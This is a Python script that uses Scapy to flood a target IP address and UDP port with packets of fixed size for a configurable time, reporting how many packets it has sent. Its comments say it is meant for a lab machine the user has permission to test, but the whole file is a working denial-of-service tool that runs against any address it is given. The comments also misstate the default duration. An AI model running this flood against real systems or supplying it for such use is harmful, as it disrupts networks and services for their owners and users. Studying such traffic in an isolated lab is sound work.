from scapy.all import IP, UDP, Raw, send
import time
import sys

# --- Configuration ---
# IMPORTANT: Replace with the IP address of your target machine.
# This should be a machine you have permission to test against (e.g., another VM in your isolated network, or your own loopback 127.0.0.1 for self-testing).
target_ip = "192.168.0.106" # !!! CHANGE THIS TO YOUR TARGET IP !!!
target_port = 53 # Common UDP port, e.g., DNS (53), NTP (123), or a random high port
duration_seconds = 500 # How long to run the flood (e.g., 30 seconds)
packet_size = 500 # Size of the UDP payload in bytes

# --- UDP Flood Logic ---
if __name__ == "__main__":
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
    if len(sys.argv) > 2:
        try:
            duration_seconds = int(sys.argv[2])
        except ValueError:
            print("Invalid duration. Using default 30 seconds.")

    print(f"Starting UDP flood to {target_ip}:{target_port} for {duration_seconds} seconds...")
    print("Press Ctrl+C to stop manually at any time.")

    payload = b"X" * packet_size # Create a dummy payload of 'X' bytes

    start_time = time.time()
    packets_sent = 0

    try:
        while time.time() - start_time < duration_seconds:
            # Craft the UDP packet
            packet = IP(dst=target_ip)/UDP(dport=target_port, sport=50000)/Raw(load=payload)
            # Send the packet (verbose=0 suppresses Scapy output per packet)
            send(packet, verbose=0)
            packets_sent += 1
            if packets_sent % 1000 == 0:
                sys.stdout.write(f"\rPackets sent: {packets_sent}")
                sys.stdout.flush()

    except KeyboardInterrupt:
        print("\nUDP flood interrupted by user.")
    except Exception as e:
        print(f"\nAn error occurred during flooding: {e}")
    finally:
        print(f"\nUDP flood finished. Total packets sent: {packets_sent}")